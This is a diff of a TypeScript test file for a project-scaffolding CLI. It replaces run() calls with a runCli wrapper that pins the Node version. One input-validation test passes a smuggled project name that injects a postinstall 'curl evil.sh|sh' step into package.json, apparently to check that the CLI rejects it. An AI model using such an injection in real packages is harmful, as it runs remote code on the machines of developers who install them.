@@ -12,6 +12,13 @@ import { Readable } from 'node:stream';
 import { run } from '../lib/cli.mjs';
 import type { PromptAdapter } from '../lib/prompts.mjs';
 
+// run() defaults nodeVersion to process.version, so calling it bare would make
+// the whole suite depend on the host's Node satisfying the engines range. Pin a
+// supported version here; the preflight tests pass their own nodeVersion and
+// override the pin via the spread.
+const runCli = (opts: Parameters<typeof run>[0]) =>
+  run({ nodeVersion: 'v22.18.0', ...opts });
+
 let workDir: string;
 beforeEach(() => {
   workDir = mkdtempSync(join(tmpdir(), 'chp-cli-test-'));
@@ -22,7 +29,7 @@ afterEach(() => {
 
 describe('run(): node adapter', () => {
   it('scaffolds a new node app with --no-install --no-git', async () => {
-    const code = await run({
+    const code = await runCli({
       argv: ['my-test-app', '--adapter=node', '--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -71,7 +78,7 @@ describe('run(): node adapter', () => {
 
 describe('run(): cloudflare adapter', () => {
   it('scaffolds a new cloudflare app, including wrangler.jsonc', async () => {
-    const code = await run({
+    const code = await runCli({
       argv: ['my-cf-app', '--adapter=cloudflare', '--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -85,7 +92,7 @@ describe('run(): cloudflare adapter', () => {
   });
 
   it('cloudflare is the default adapter', async () => {
-    await run({
+    await runCli({
       argv: ['default-cf', '--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -103,7 +110,7 @@ describe('run(): target dir validation', () => {
     await fs.mkdir(target);
     await fs.writeFile(join(target, 'README.md'), 'hi');
 
-    const code = await run({
+    const code = await runCli({
       argv: ['existing', '--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -116,7 +123,7 @@ describe('run(): target dir validation', () => {
     const fs = await import('node:fs/promises');
     await fs.mkdir(target);
 
-    const code = await run({
+    const code = await runCli({
       argv: ['empty-existing', '--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -133,7 +140,7 @@ describe('run(): target dir validation', () => {
     const originalError = console.error;
     console.error = (...args: unknown[]) => errs.push(args.join(' '));
     try {
-      const code = await run({
+      const code = await runCli({
         argv: [
           'app", "postinstall": "curl evil.sh|sh #',
           '--no-install',
@@ -165,7 +172,7 @@ describe('run(): install step', () => {
       };
     };
 
-    const code = await run({
+    const code = await runCli({
       argv: ['installed-app', '--adapter=node', '--no-git'],
       cwd: workDir,
       env: {
@@ -191,7 +198,7 @@ describe('run(): install step', () => {
       };
     };
 
-    await run({
+    await runCli({
       argv: ['skipped-app', '--adapter=node', '--no-install', '--no-git'],
       cwd: workDir,
       env: { npm_config_user_agent: 'npm/10.2.5' },
@@ -208,7 +215,7 @@ describe('run(): install step', () => {
       },
     });
 
-    const code = await run({
+    const code = await runCli({
       argv: ['fail-install', '--adapter=node', '--no-git'],
       cwd: workDir,
       env: { npm_config_user_agent: 'pnpm/10' },
@@ -233,7 +240,7 @@ describe('run(): install step', () => {
       };
     };
 
-    await run({
+    await runCli({
       argv: ['win-app', '--adapter=node', '--no-git'],
       cwd: workDir,
       env: { npm_config_user_agent: 'npm/11 node/v26 win32 x64' },
@@ -260,7 +267,7 @@ describe('run(): install step', () => {
       };
     };
 
-    await run({
+    await runCli({
       argv: ['posix-app', '--adapter=node', '--no-git'],
       cwd: workDir,
       env: { npm_config_user_agent: 'npm/11 node/v26 darwin arm64' },
@@ -284,7 +291,7 @@ describe('run(): git step', () => {
       };
     };
 
-    await run({
+    await runCli({
       argv: ['git-app', '--adapter=node', '--no-install'],
       cwd: workDir,
       env: {},
@@ -307,7 +314,7 @@ describe('run(): git step', () => {
       };
     };
 
-    await run({
+    await runCli({
       argv: ['no-git-app', '--adapter=node', '--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -333,7 +340,7 @@ describe('run(): git step', () => {
       };
     };
 
-    const code = await run({
+    const code = await runCli({
       argv: ['git-missing-app', '--adapter=node', '--no-install'],
       cwd: workDir,
       env: {},
@@ -359,7 +366,7 @@ describe('run(): git step', () => {
       };
     };
 
-    const code = await run({
+    const code = await runCli({
       argv: ['pm-missing-app', '--adapter=node', '--no-git'],
       cwd: workDir,
       env: { npm_config_user_agent: 'pnpm/10' },
@@ -385,7 +392,7 @@ describe('run(): git step', () => {
       };
     };
 
-    const code = await run({
+    const code = await runCli({
       argv: ['git-fail-app', '--adapter=node', '--no-install'],
       cwd: workDir,
       env: {},
@@ -402,7 +409,7 @@ describe('run(): help and version', () => {
     const originalLog = console.log;
     console.log = (...args) => lines.push(args.join(' '));
     try {
-      const code = await run({ argv: ['--help'], cwd: workDir, env: {} });
+      const code = await runCli({ argv: ['--help'], cwd: workDir, env: {} });
       expect(code).toBe(0);
       expect(lines.join('\n').toLowerCase()).toContain('usage');
     } finally {
@@ -415,7 +422,7 @@ describe('run(): help and version', () => {
     const originalLog = console.log;
     console.log = (...args) => lines.push(args.join(' '));
     try {
-      const code = await run({ argv: ['--version'], cwd: workDir, env: {} });
+      const code = await runCli({ argv: ['--version'], cwd: workDir, env: {} });
       expect(code).toBe(0);
       const { version } = JSON.parse(
         readFileSync(new URL('../package.json', import.meta.url), 'utf8')
@@ -427,7 +434,7 @@ describe('run(): help and version', () => {
   });
 
   it('unknown flag returns 2', async () => {
-    const code = await run({ argv: ['--bogus'], cwd: workDir, env: {} });
+    const code = await runCli({ argv: ['--bogus'], cwd: workDir, env: {} });
     expect(code).toBe(2);
   });
 });
@@ -443,7 +450,7 @@ describe('run(): next-steps output', () => {
           if (e === 'close') queueMicrotask(() => cb(0));
         },
       });
-      await run({
+      await runCli({
         argv: ['next-app', '--adapter=node', '--no-install', '--no-git'],
         cwd: workDir,
         env: { npm_config_user_agent: 'pnpm/10' },
@@ -462,14 +469,14 @@ describe('run(): next-steps output', () => {
 
 describe('run(): add-agents', () => {
   it('writes AGENTS.md and CLAUDE.md into the cwd', async () => {
-    const code = await run({ argv: ['add-agents'], cwd: workDir, env: {} });
+    const code = await runCli({ argv: ['add-agents'], cwd: workDir, env: {} });
     expect(code).toBe(0);
     expect(existsSync(join(workDir, 'AGENTS.md'))).toBe(true);
     expect(existsSync(join(workDir, 'CLAUDE.md'))).toBe(true);
   });
 
   it('writes the recipes and corpus under agents/', async () => {
-    const code = await run({ argv: ['add-agents'], cwd: workDir, env: {} });
+    const code = await runCli({ argv: ['add-agents'], cwd: workDir, env: {} });
     expect(code).toBe(0);
     expect(existsSync(join(workDir, 'AGENTS.md'))).toBe(true);
     expect(existsSync(join(workDir, 'CLAUDE.md'))).toBe(true);
@@ -481,7 +488,7 @@ describe('run(): add-agents', () => {
 
   it('does not overwrite an existing AGENTS.md without --force', async () => {
     writeFileSync(join(workDir, 'AGENTS.md'), 'KEEP');
-    const code = await run({ argv: ['add-agents'], cwd: workDir, env: {} });
+    const code = await runCli({ argv: ['add-agents'], cwd: workDir, env: {} });
     expect(code).toBe(0); // CLAUDE.md still created, so not all skipped
     expect(readFileSync(join(workDir, 'AGENTS.md'), 'utf8')).toBe('KEEP');
     expect(existsSync(join(workDir, 'CLAUDE.md'))).toBe(true);
@@ -489,14 +496,14 @@ describe('run(): add-agents', () => {
 
   it('returns 1 when every target is skipped', async () => {
     // First run populates all files; second run with no --force skips all.
-    await run({ argv: ['add-agents'], cwd: workDir, env: {} });
-    const code = await run({ argv: ['add-agents'], cwd: workDir, env: {} });
+    await runCli({ argv: ['add-agents'], cwd: workDir, env: {} });
+    const code = await runCli({ argv: ['add-agents'], cwd: workDir, env: {} });
     expect(code).toBe(1);
   });
 
   it('overwrites with --force', async () => {
     writeFileSync(join(workDir, 'AGENTS.md'), 'OLD');
-    const code = await run({
+    const code = await runCli({
       argv: ['add-agents', '--force'],
       cwd: workDir,
       env: {},
@@ -545,7 +552,7 @@ function fakePrompts(answers: {
 describe('run(): interactive wizard', () => {
   it('prompts for dir + adapter + ui and scaffolds a node+ui app', async () => {
     const fake = fakePrompts({ dir: 'wiz-app', adapter: 'node', ui: true });
-    const code = await run({
+    const code = await runCli({
       argv: ['--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -563,7 +570,7 @@ describe('run(): interactive wizard', () => {
 
   it('does not prompt for a value supplied by a flag', async () => {
     const fake = fakePrompts({ dir: 'flagged' });
-    await run({
+    await runCli({
       argv: [
         'flagged',
         '--adapter=cloudflare',
@@ -595,7 +602,7 @@ describe('run(): interactive wizard', () => {
         if (e === 'close') queueMicrotask(() => cb(cmd === 'git' ? 0 : 1));
       },
     });
-    const code = await run({
+    const code = await runCli({
       argv: ['fail-install', '--no-git'],
       cwd: workDir,
       env: { npm_config_user_agent: 'pnpm/10' },
@@ -616,7 +623,7 @@ describe('run(): interactive wizard', () => {
     await fsp.mkdir(target);
     await fsp.writeFile(join(target, 'keep.txt'), 'x');
     const fake = fakePrompts({ dir: 'occupied' });
-    const code = await run({
+    const code = await runCli({
       argv: ['occupied', '--adapter=node', '--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -632,7 +639,7 @@ describe('run(): interactive wizard', () => {
 describe('run(): target-dir edge cases', () => {
   it('non-interactive: a target name that is an existing file errors', async () => {
     writeFileSync(join(workDir, 'afile'), 'x');
-    const code = await run({
+    const code = await runCli({
       argv: ['afile', '--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -646,7 +653,7 @@ describe('run(): target-dir edge cases', () => {
       isTTY?: boolean;
     };
     stdin.isTTY = false;
-    const code = await run({
+    const code = await runCli({
       argv: ['--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -677,7 +684,7 @@ describe('run(): install failure diagnostics', () => {
           if (e === 'close') queueMicrotask(() => cb(cmd === 'git' ? 0 : 1));
         },
       });
-      const code = await run({
+      const code = await runCli({
         argv: ['cap-app', '--no-git'],
         cwd: workDir,
         env: { npm_config_user_agent: 'pnpm/10' },
@@ -705,7 +712,7 @@ describe('run(): install failure diagnostics', () => {
           if (e === 'close') queueMicrotask(() => cb(1));
         },
       });
-      const code = await run({
+      const code = await runCli({
         argv: ['rec-app', '--adapter=node', '--no-git'],
         cwd: workDir,
         env: { npm_config_user_agent: 'pnpm/10' },
@@ -734,7 +741,7 @@ describe('run(): install failure diagnostics', () => {
         if (e === 'close') queueMicrotask(() => cb(cmd === 'git' ? 0 : 1));
       },
     });
-    const code = await run({
+    const code = await runCli({
       argv: ['rec-int-app', '--no-git'],
       cwd: workDir,
       env: { npm_config_user_agent: 'pnpm/10' },
@@ -756,7 +763,7 @@ describe('run(): Node version preflight', () => {
     const originalError = console.error;
     console.error = (...args: unknown[]) => errs.push(args.join(' '));
     try {
-      const code = await run({
+      const code = await runCli({
         argv: ['old-node-app', '--no-install', '--no-git'],
         cwd: workDir,
         env: {},
@@ -772,7 +779,7 @@ describe('run(): Node version preflight', () => {
   });
 
   it('scaffolds normally on a supported Node', async () => {
-    const code = await run({
+    const code = await runCli({
       argv: ['new-node-app', '--no-install', '--no-git'],
       cwd: workDir,
       env: {},
@@ -789,7 +796,7 @@ describe('run(): Node version preflight', () => {
     const originalLog = console.log;
     console.log = (...args) => lines.push(args.join(' '));
     try {
-      const code = await run({
+      const code = await runCli({
         argv: ['--help'],
         cwd: workDir,
         env: {},
